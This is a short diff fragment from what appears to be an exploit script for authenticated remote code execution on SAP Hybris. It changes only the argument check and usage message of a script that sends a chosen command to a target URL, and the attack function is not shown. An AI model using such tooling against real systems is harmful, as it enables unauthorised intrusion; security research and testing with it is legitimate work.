@@ -54,7 +54,7 @@ def sap_rce(host, cmd):
 
 print("\nSAP Hybris Authenticated RCE\nAuthor: @erberkan (B3r-Sec)")
 
-if len(sys.argv) > 1:
+if len(sys.argv) == 3:
     sap_rce(sys.argv[1], sys.argv[2])
 else:
     print("\nUsage: python3 sap_hybris_rce.py <URL> <CMD>\nExample: python3 sap_hybris_rce.py http://192.168.13.37 "
